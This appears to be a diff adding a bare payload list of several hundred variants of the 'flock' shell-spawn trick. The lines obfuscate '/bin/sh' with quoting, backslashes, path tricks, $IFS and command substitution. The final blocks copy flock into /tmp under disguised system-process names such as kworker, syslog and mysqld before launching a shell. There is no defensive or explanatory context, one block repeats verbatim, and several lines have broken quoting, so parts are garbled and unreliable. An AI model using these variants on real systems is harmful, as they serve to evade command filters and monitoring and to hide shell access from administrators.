@@ -1,0 +1,390 @@
+1. flock -u / /bin/'sh'
+2. flock -u / /bin/s"h"
+3. flock -u / /b'in'/sh
+4. flock -u / /bin//sh
+5. flock -u / //bin/sh
+6. flock -u / /b"i"n/sh
+7. flock -u / /bin/s'h'
+8. flock -u / "/bin/sh"
+9. flock -u / '/bin/sh'
+10. flock -u / /bin/s"h"
+11. flock -u / /bi'n'/sh
+12. flock -u / /b"i"n//sh
+13. flock -u / //b'in'/sh
+14. flock -u / /b\in/sh
+15. flock -u / /bin\sh
+16. flock -u / /bin/s\h
+17. flock -u / /bin/sh\
+18. flock -u / /bin/sh/
+19. flock -u / /bin/sh/.
+20. flock -u / /bin/.sh
+21. flock -u / /bi\n/sh
+22. flock -u / /b\i\n/s\h
+23. flock -u / /bin/'s''h'
+24. flock -u / /bin/s""h
+25. flock -u / /bi"n"/s"h"
+26. flock -u / /bin/s"h
+27. flock -u / /b'in'//sh
+28. flock -u / //bin//sh
+29. flock -u / /bin////sh
+30. flock -u / /b'i'n/s'h'
+1. flock -u / /b""in/sh
+2. flock -u / /bi'n'/'sh'
+3. flock -u / /bin/s"h"'
+4. flock -u / /bin/'s"h"'
+5. flock -u / /"bin"/"sh"
+6. flock -u / /b'in//sh
+7. flock -u / /b"in/"sh"
+8. flock -u / /bin///"sh"
+9. flock -u / /bin/./sh
+10. flock -u / /b''in/sh
+11. flock -u / /bi''n/sh
+12. flock -u / /bin/s'h'
+13. flock -u / /bin/s"h"'
+14. flock -u / /bin//s'h'
+15. flock -u / /b"in/sh"
+16. flock -u / /b'in/sh'
+17. flock -u / /bi'n/s"h"
+18. flock -u / /bin/s"h\
+19. flock -u / /bin\s"h"
+20. flock -u / /bin\s\h
+21. flock -u / /b\in\sh
+22. flock -u / /bin/s\h\
+23. flock -u / /bi"n"/s'h'
+24. flock -u / /bin/s"h"\
+25. flock -u / /bin/s"h"
+26. flock -u / /bi'n/./sh
+27. flock -u / /bi"n"/./sh
+28. flock -u / /bin/.//sh
+29. flock -u / /bi""n/s""h
+30. flock -u / /"b""in"/"sh"
+1. `flock --unlock / /bin/sh`
+2. `flock -s / /bin/sh`
+3. `flock --shared / /bin/sh`
+4. `flock -x / /bin/sh`
+5. `flock --exclusive / /bin/sh`
+6. `flock -n -x / /bin/sh`
+7. `flock --nonblock --exclusive / /bin/sh`
+8. `flock -n --exclusive / /bin/sh`
+9. `flock --exclusive -n / /bin/sh`
+10. `flock --shared -n / /bin/sh`
+11. `flock --nonblock -s / /bin/sh`
+12. `flock -s -n / /bin/sh`
+13. `flock /bin/sh -c "echo 1" & flock --exclusive /bin/sh`
+14. `flock -E 0 / /bin/sh`
+15. `flock --conflict-exit-code=0 / /bin/sh`
+16. `flock -w 0 / /bin/sh`
+17. `flock --timeout=0 / /bin/sh`
+18. `flock -x -w 0 / /bin/sh`
+19. `flock --exclusive --timeout=0 / /bin/sh`
+20. `flock -s -w 0 / /bin/sh`
+21. `flock --shared --timeout=0 / /bin/sh`
+22. `flock --verbose -x / /bin/sh`
+23. `flock -v -x / /bin/sh`
+24. `flock --verbose --exclusive / /bin/sh`
+25. `flock --verbose --shared / /bin/sh`
+26. `flock --verbose --unlock / /bin/sh`
+27. `flock -s --verbose / /bin/sh`
+28. `flock -x --verbose / /bin/sh`
+29. `flock --shared /bin/bash`
+30. `flock --exclusive /bin/sh`
+1. `flock --unlock /bin /bin/sh`
+2. `flock --unlock /tmp /bin/sh`
+3. `flock --unlock /dev/null /bin/sh`
+4. `flock --unlock /proc/self /bin/sh`
+5. `flock --unlock /etc/passwd /bin/sh`
+6. `flock -u /dev/shm /bin/sh`
+7. `flock --unlock /run/lock /bin/sh`
+8. `flock -x /dev/zero /bin/sh`
+9. `flock --exclusive /etc/hosts /bin/sh`
+10. `flock --shared /tmp/lockfile /bin/sh`
+11. `flock -s /dev/random /bin/sh`
+12. `flock --shared /proc/version /bin/sh`
+13. `flock --exclusive /run/shm/lock /bin/sh`
+14. `flock -s /tmp/.X11-unix /bin/sh`
+15. `flock --unlock /var/tmp /bin/sh`
+16. `flock --exclusive /var/log /bin/sh`
+17. `flock --unlock /var/run /bin/sh`
+18. `flock --unlock /lib/modules /bin/sh`
+19. `flock -x /home/user /bin/sh`
+20. `flock --shared /etc/group /bin/sh`
+21. `flock -s /etc/shadow /bin/sh`
+22. `flock --unlock $(mktemp) /bin/sh`
+23. `flock -u $(mktemp -u) /bin/sh`
+24. `flock --unlock /bin/sh -c true; /bin/sh`
+25. `flock -x /bin/sh -c ":"; /bin/sh`
+26. `flock -s /etc/hostname /bin/sh`
+27. `flock -x /etc/issue /bin/sh`
+28. `flock -s /etc/motd /bin/sh`
+29. `flock --exclusive /proc/cpuinfo /bin/sh`
+30. `flock --shared /proc/meminfo /bin/sh`
+1. `flock --unlock /bin /bin/sh`
+2. `flock --unlock /tmp /bin/sh`
+3. `flock --unlock /dev/null /bin/sh`
+4. `flock --unlock /proc/self /bin/sh`
+5. `flock --unlock /etc/passwd /bin/sh`
+6. `flock -u /dev/shm /bin/sh`
+7. `flock --unlock /run/lock /bin/sh`
+8. `flock -x /dev/zero /bin/sh`
+9. `flock --exclusive /etc/hosts /bin/sh`
+10. `flock --shared /tmp/lockfile /bin/sh`
+11. `flock -s /dev/random /bin/sh`
+12. `flock --shared /proc/version /bin/sh`
+13. `flock --exclusive /run/shm/lock /bin/sh`
+14. `flock -s /tmp/.X11-unix /bin/sh`
+15. `flock --unlock /var/tmp /bin/sh`
+16. `flock --exclusive /var/log /bin/sh`
+17. `flock --unlock /var/run /bin/sh`
+18. `flock --unlock /lib/modules /bin/sh`
+19. `flock -x /home/user /bin/sh`
+20. `flock --shared /etc/group /bin/sh`
+21. `flock -s /etc/shadow /bin/sh`
+22. `flock --unlock $(mktemp) /bin/sh`
+23. `flock -u $(mktemp -u) /bin/sh`
+24. `flock --unlock /bin/sh -c true; /bin/sh`
+25. `flock -x /bin/sh -c ":"; /bin/sh`
+26. `flock -s /etc/hostname /bin/sh`
+27. `flock -x /etc/issue /bin/sh`
+28. `flock -s /etc/motd /bin/sh`
+29. `flock --exclusive /proc/cpuinfo /bin/sh`
+30. `flock --shared /proc/meminfo /bin/sh`
+1. `flock / /bin/sh`
+2. `flock / /bin/bash`
+3. `flock / /bin/dash`
+4. `flock / /bin/zsh`
+5. `flock / /bin/fish`
+6. `flock / /usr/bin/sh`
+7. `flock / /usr/bin/bash`
+8. `flock / /usr/bin/dash`
+9. `flock / /usr/bin/zsh`
+10. `flock / /usr/bin/fish`
+11. `flock / -- /bin/sh`
+12. `flock / -- /bin/bash`
+13. `flock / -- /bin/dash`
+14. `flock / -- /bin/zsh`
+15. `flock / -- /bin/fish`
+16. `flock -x / /bin/sh`
+17. `flock -x / /bin/bash`
+18. `flock -x / /bin/dash`
+19. `flock -x / /bin/zsh`
+20. `flock -x / /bin/fish`
+21. `flock -n / /bin/sh`
+22. `flock -n / /bin/bash`
+23. `flock -xn / /bin/sh`
+24. `flock -nx / /bin/bash`
+25. `flock -x -n / /bin/sh`
+26. `flock -n -x / /bin/bash`
+27. `flock --exclusive / /bin/sh`
+28. `flock --exclusive / /bin/bash`
+29. `flock -- /usr/bin/sh`
+30. `flock -xn / -- /bin/sh`
+1. `flock /bin /bin/sh`
+2. `flock -x /tmp/lockfile /bin/sh`
+3. `flock -x /tmp/lockfile -- /bin/sh`
+4. `flock --timeout 5 / /bin/sh`
+5. `flock --nonblock / /bin/sh`
+6. `flock --conflict-exit-code 99 / /bin/sh`
+7. `flock -E 1 / /bin/sh`
+8. `flock -x /var/lock/lockfile /bin/sh`
+9. `flock /dev/shm/lock /bin/sh`
+10. `flock /tmp/.X11-lock /bin/sh`
+11. `flock /etc/passwd /bin/sh`
+12. `flock -x -n /etc/hosts /bin/sh`
+13. `flock -- /usr/bin/bash`
+14. `flock -x /tmp/lock -- /usr/bin/bash`
+15. `flock /tmp/l /bin/bash`
+16. `flock -x /tmp/l -- /bin/bash`
+17. `flock /dev/null /bin/sh`
+18. `flock /tmp/.X0-lock /bin/bash`
+19. `flock /etc/shadow /bin/sh`
+20. `flock /tmp/lock sh`
+21. `flock /tmp/lockfile bash`
+22. `flock --nonblock /etc/hosts -- /bin/sh`
+23. `flock -- /usr/bin/zsh`
+24. `flock -xn /tmp/lock /bin/dash`
+25. `flock -x -- /bin/zsh`
+26. `flock -x /tmp/f -- /bin/fish`
+27. `flock /tmp/lockfile /usr/bin/sh`
+28. `flock /tmp/lockfile /usr/bin/dash`
+29. `flock -- /usr/bin/fish`
+30. `flock -x /tmp/a /usr/bin/bash`
+1. `flock -un / /bin/sh`
+2. `flock -nu / /bin/sh`
+3. `flock -un / /bin/bash`
+4. `flock -nu / /bin/bash`
+5. `flock -un / /bin/dash`
+6. `flock -nu / /bin/dash`
+7. `flock -un / /bin/zsh`
+8. `flock -nu / /bin/zsh`
+9. `flock -un / /bin/fish`
+10. `flock -nu / /bin/fish`
+11. `flock -nu -- /bin/sh`
+12. `flock -un -- /bin/sh`
+13. `flock -- -un /bin/sh`
+14. `flock -- -nu /bin/sh`
+15. `flock -un / -- /bin/sh`
+16. `flock -nu / -- /bin/sh`
+17. `flock -n -u / /bin/sh`
+18. `flock -u -n / /bin/sh`
+19. `flock -nu /bin/sh`
+20. `flock -un /bin/sh`
+21. `flock -un /bin/bash`
+22. `flock -nu /bin/bash`
+23. `flock -nu /tmp/lock /bin/sh`
+24. `flock -un /tmp/lock /bin/sh`
+25. `flock -un /tmp/lock -- /bin/sh`
+26. `flock -nu /tmp/lock -- /bin/sh`
+27. `flock -un / -- /bin/bash`
+28. `flock -nu / -- /bin/bash`
+29. `flock -un -- /bin/zsh`
+30. `flock -nu -- /bin/zsh`
+1. `flock -un /tmp/lockfile /bin/dash`
+2. `flock -nu /tmp/lockfile /bin/dash`
+3. `flock -un /var/lock/x /bin/sh`
+4. `flock -nu /var/lock/x /bin/sh`
+5. `flock -un /var/lock/x -- /bin/sh`
+6. `flock -nu /var/lock/x -- /bin/sh`
+7. `flock -un /dev/shm/lock /bin/sh`
+8. `flock -nu /dev/shm/lock /bin/sh`
+9. `flock -nu /dev/shm/lock -- /bin/sh`
+10. `flock -un /dev/shm/lock -- /bin/sh`
+11. `flock -un / -- /bin/'sh'`
+12. `flock -nu / -- /bin/"sh"`
+13. `flock -un / -- /bin/s'h'`
+14. `flock -nu / -- /bin/sh$IFS`
+15. `flock -un / -- //bin//sh`
+16. `flock -nu / -- //bin///sh`
+17. `flock -un / -- /bin/s\\h`
+18. `flock -nu / -- /bin/sh\`
+19. `flock -un / -- $(which sh)`
+20. `flock -nu / -- $(which sh)`
+21. `flock -un / -- /proc/self/exe`
+22. `flock -nu / -- /proc/self/exe`
+23. `flock -un / -- /bin/sh -c true`
+24. `flock -nu / -- /bin/sh -c true`
+25. `flock -un / -- bash -i`
+26. `flock -nu / -- bash -i`
+27. `flock -un /bin /bin/sh`
+28. `flock -nu /bin /bin/sh`
+29. `flock -un /tmp /bin/sh`
+30. `flock -nu /tmp /bin/sh`
+1. `flock -u / /bin/'sh'`
+2. `flock -u / /bin/"sh"`
+3. `flock -u / /bin/s'h'`
+4. `flock -u / /bin/s"h"`
+5. `flock -u / /bin//sh`
+6. `flock -u / //bin/sh`
+7. `flock -u / //bin//sh`
+8. `flock -u / /bin///sh`
+9. `flock -u / ///bin/sh`
+10. `flock -u / /bin////sh`
+11. `flock -u / /b'in'/sh`
+12. `flock -u / /b"in"/sh`
+13. `flock -u / /bi'n'/sh`
+14. `flock -u / /bi"n"/sh`
+15. `flock -u / /bin/s''h`
+16. `flock -u / /bin/s""h`
+17. `flock -u / /bin/'s''h'`
+18. `flock -u / /bin/"s""h"`
+19. `flock -u / /bin//s'h'`
+20. `flock -u / //bin/s"h"`
+21. `flock -u / ///bin//'sh'`
+22. `flock -u / /bin////'sh'`
+23. `flock -u / //b'in'//sh`
+24. `flock -u / //b"in"//sh`
+25. `flock -u / ///bi'n'///sh`
+26. `flock -u / ///bi"n"///sh`
+27. `flock -u / /bin/s\h`
+28. `flock -u / //bin/s\h`
+29. `flock -u / /bin///s\h`
+30. `flock -u / ///bin////s\h`
+1. `flock -u / /b/i/n/sh`
+2. `flock -u / /bin/./sh`
+3. `flock -u / /bin/../bin/sh`
+4. `flock -u / /bin/sh\`
+5. `flock -u / "$(echo /bin/sh)"`
+6. `flock -u / $(echo /bin/sh)`
+7. `flock -u /` echo /bin/sh``
+8. `flock -u / /$(echo bin)/sh`
+9. `flock -u / /bin/$(echo sh)`
+10. `flock -u / /$(echo bin/sh)`
+11. `flock -u / /bi$(echo n)/sh`
+12. `flock -u / /bin/s$(echo h)`
+13. `flock -u / /b$(echo in)/sh`
+14. `flock -u / /bin/$(echo s)h`
+15. `flock -u / /bin/sh\0`
+16. `flock -u / /bin/sh$IFS`
+17. `flock -u / /bin/sh$'\x00'`
+18. `flock -u / /bin/$'s''h'`
+19. `flock -u / $'/'bin/'s'h'`
+20. `flock -u / $'/'bin/sh'`
+21. `flock -u / $'//bin//sh'`
+22. `flock -u / /bin/$'sh'`
+23. `flock -u / /bin/sh$'\n'`
+24. `flock -u / $'/bin/sh'`
+25. `flock -u / $(printf /bin/sh)`
+26. `flock -u /` /bin/echo /bin/sh``
+27. `flock -u / $(cat <<< "/bin/sh")`
+28. `flock -u / $(echo -n /bin/; echo sh)`
+29. `flock -u / $(echo /bin/sh | tr -d '\n')`
+30. `flock -u / "$(printf '/bin/%s' sh)"`
+1. `cp /usr/bin/flock /tmp/f && /tmp/f -u / /bin/sh`
+2. `cp $(which flock) ./f; ./f -u / /bin/sh`
+3. `install /usr/bin/flock /tmp/locky && /tmp/locky -u / /bin/sh`
+4. `cp /usr/bin/flock /dev/shm/l; /dev/shm/l -u / /bin/sh`
+5. `cp /usr/bin/flock /tmp/.fl; /tmp/.fl -u / /bin/sh`
+6. `cp /usr/bin/flock /tmp/runlock; /tmp/runlock -u / /bin/sh`
+7. `cp /usr/bin/flock /tmp/ls; /tmp/ls -u / /bin/sh`
+8. `cp /usr/bin/flock /tmp/init; /tmp/init -u / /bin/sh`
+9. `cp /usr/bin/flock /tmp/fd; /tmp/fd -u / /bin/sh`
+10. `cp /usr/bin/flock /tmp/daemon; /tmp/daemon -u / /bin/sh`
+11. `cp /usr/bin/flock /tmp/kworker; /tmp/kworker -u / /bin/sh`
+12. `cp /usr/bin/flock /tmp/logger; /tmp/logger -u / /bin/sh`
+13. `cp /usr/bin/flock /tmp/nologin; /tmp/nologin -u / /bin/sh`
+14. `cp /usr/bin/flock /tmp/tty; /tmp/tty -u / /bin/sh`
+15. `cp /usr/bin/flock /tmp/tar; /tmp/tar -u / /bin/sh`
+16. `cp /usr/bin/flock /tmp/fcron; /tmp/fcron -u / /bin/sh`
+17. `cp /usr/bin/flock /tmp/getty; /tmp/getty -u / /bin/sh`
+18. `cp /usr/bin/flock /tmp/netcat; /tmp/netcat -u / /bin/sh`
+19. `cp /usr/bin/flock /tmp/awk; /tmp/awk -u / /bin/sh`
+20. `cp /usr/bin/flock /tmp/python; /tmp/python -u / /bin/sh`
+21. `cp /usr/bin/flock /tmp/cronjob; /tmp/cronjob -u / /bin/sh`
+22. `cp /usr/bin/flock /tmp/.hidden; /tmp/.hidden -u / /bin/sh`
+23. `cp /usr/bin/flock /tmp/bashful; /tmp/bashful -u / /bin/sh`
+24. `cp /usr/bin/flock /tmp/snap; /tmp/snap -u / /bin/sh`
+25. `cp /usr/bin/flock /tmp/nginx; /tmp/nginx -u / /bin/sh`
+26. `cp /usr/bin/flock /tmp/syslog; /tmp/syslog -u / /bin/sh`
+27. `cp /usr/bin/flock /tmp/journal; /tmp/journal -u / /bin/sh`
+28. `cp /usr/bin/flock /tmp/initd; /tmp/initd -u / /bin/sh`
+29. `cp /usr/bin/flock /tmp/mysqld; /tmp/mysqld -u / /bin/sh`
+30. `cp /usr/bin/flock /tmp/httpd; /tmp/httpd -u / /bin/sh`
+1. `cp /usr/bin/flock /tmp/x && /tmp/x -u / /bin/sh`
+2. `cp /usr/bin/flock /tmp/_flock && /tmp/_flock -u / /bin/sh`
+3. `cp /usr/bin/flock /tmp/locktool && /tmp/locktool -u / /bin/sh`
+4. `cp /usr/bin/flock /tmp/busybox && /tmp/busybox -u / /bin/sh`
+5. `cp /usr/bin/flock /tmp/.systemd && /tmp/.systemd -u / /bin/sh`
+6. `cp /usr/bin/flock /tmp/.dockerd && /tmp/.dockerd -u / /bin/sh`
+7. `cp /usr/bin/flock /tmp/dnsmasq && /tmp/dnsmasq -u / /bin/sh`
+8. `cp /usr/bin/flock /tmp/mountd && /tmp/mountd -u / /bin/sh`
+9. `cp /usr/bin/flock /tmp/binfmt_misc && /tmp/binfmt_misc -u / /bin/sh`
+10. `cp /usr/bin/flock /tmp/u && /tmp/u -u / /bin/sh`
+11. `cp /usr/bin/flock /tmp/shinit && /tmp/shinit -u / /bin/sh`
+12. `cp /usr/bin/flock /tmp/sysctl && /tmp/sysctl -u / /bin/sh`
+13. `cp /usr/bin/flock /tmp/locky.sh && /tmp/locky.sh -u / /bin/sh`
+14. `cp /usr/bin/flock /tmp/serv && /tmp/serv -u / /bin/sh`
+15. `cp /usr/bin/flock /tmp/pid1 && /tmp/pid1 -u / /bin/sh`
+16. `cp /usr/bin/flock /tmp/conf && /tmp/conf -u / /bin/sh`
+17. `cp /usr/bin/flock /tmp/resolver && /tmp/resolver -u / /bin/sh`
+18. `cp /usr/bin/flock /tmp/wrapper && /tmp/wrapper -u / /bin/sh`
+19. `cp /usr/bin/flock /tmp/update && /tmp/update -u / /bin/sh`
+20. `cp /usr/bin/flock /tmp/startup && /tmp/startup -u / /bin/sh`
+21. `cp /usr/bin/flock /tmp/shellrunner && /tmp/shellrunner -u / /bin/sh`
+22. `cp /usr/bin/flock /tmp/binx && /tmp/binx -u / /bin/sh`
+23. `cp /usr/bin/flock /tmp/shbin && /tmp/shbin -u / /bin/sh`
+24. `cp /usr/bin/flock /tmp/tmpx && /tmp/tmpx -u / /bin/sh`
+25. `cp /usr/bin/flock /tmp/tasker && /tmp/tasker -u / /bin/sh`
+26. `cp /usr/bin/flock /tmp/fsync && /tmp/fsync -u / /bin/sh`
+27. `cp /usr/bin/flock /tmp/proxy && /tmp/proxy -u / /bin/sh`
+28. `cp /usr/bin/flock /tmp/syncd && /tmp/syncd -u / /bin/sh`
+29. `cp /usr/bin/flock /tmp/.bashrc && /tmp/.bashrc -u / /bin/sh`
+30. `cp /usr/bin/flock /tmp/jobctl && /tmp/jobctl -u / /bin/sh`
